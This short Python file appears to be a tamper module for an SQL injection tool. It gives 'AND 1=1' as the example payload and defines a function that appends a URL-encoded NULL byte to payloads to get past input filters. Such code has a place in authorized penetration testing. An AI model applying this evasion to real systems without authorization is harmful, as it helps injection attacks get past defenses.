__example_payload__ = "AND 1=1"
__type__ = "appending a NULL byte to the end of the payload"


def tamper(payload, **kwargs):
    payload = str(payload)
    return f"{payload}%00"